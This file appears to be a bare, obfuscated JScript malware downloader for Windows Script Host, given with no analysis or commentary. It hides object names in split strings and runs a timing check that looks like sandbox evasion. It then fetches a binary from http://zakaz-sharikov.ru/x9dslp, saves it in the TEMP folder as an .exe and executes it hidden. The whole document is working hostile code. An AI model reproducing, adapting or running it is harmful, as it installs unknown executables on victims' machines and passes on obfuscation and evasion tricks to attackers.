var W0 = false;
var VR = "Create"+"Object";
var HZ = function IL() {return WScript[VR]("WScript"+".Shell");}(), R = 11;
var D = "MSXML2"+".XMLHTTP";
var Q = 2;
var LX = Q - 2;
function S(Z1){HZ["Run"](Z1, LX, LX);};
function W(){return D + "";};
function X(E0, NP){LX = LX * 1; return E0 - NP;};
function HG(){return VR;};
/*@cc_on
  @if (@_win32 || @_win64)
    W0 = true;
  @end
@*/
if (W0)
{
var C = "";
function CP(){return 22;};
var EQ = 0; var Y = 0;
function F()
{
var OH = new this["Date"]();
var G = OH["getUTCMilliseconds"]();
WScript["Sleep"](CP());
var OH = new this["Date"]();
var M = OH["getUTCMilliseconds"]();
WScript["Sleep"](CP());
var OH = new this["Date"]();
var Z0 = OH["getUTCMilliseconds"]();
var EQ = "E";
EQ = X(M, G);
var Y = "OU";
Y = X(Z0, M);
C = "open";
return X(EQ, Y);
}
var T = false;
var IG0 = false;
for (var WZ = LX; WZ < CP() * 1; WZ++){if (F() != LX){
T = true; 
Y = "31" + 11 * EQ + Y; 
IG0 = true; 
break;
}}
function WY() {return ((T == true) && (T == IG0)) ? 1 : LX;};
if (T && WY() && IG0){
function KJ() {return HZ["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "6BloU934t.ex" + "e";};
 TO = W();
 X0 = WScript[VR](TO);
 var L = 1;
do { 
	for (;L;){
	try {
		if (L == 1)
		{
			X0[C]("GET", "http://zakaz-sharikov.ru/x9dslp", false);
			X0["send"]();
			N = "Sleep";
			L = 2;
		}
		WScript[N](CP() + 120); 
		if (X0["readystate"] < 2 * 2) continue;
		L = LX;
		function JK(IG) {var H = (1, 2, 3, 4, 5, IG); return H;};
		OP = WScript[HG()]("ADODB.Stream");
		TO = OP;
		TO[C]();
		TO["type"] = JK(1);
		TO["write"](X0["ResponseBody"]);
		OP["position"] = JK(LX);
		TO["Save" + "ToFile"](KJ(), 2);
		OP["cl"+"ose"]();
		Z = KJ();
		S(Z);
	} catch(P){};};
}while (L);
}
}

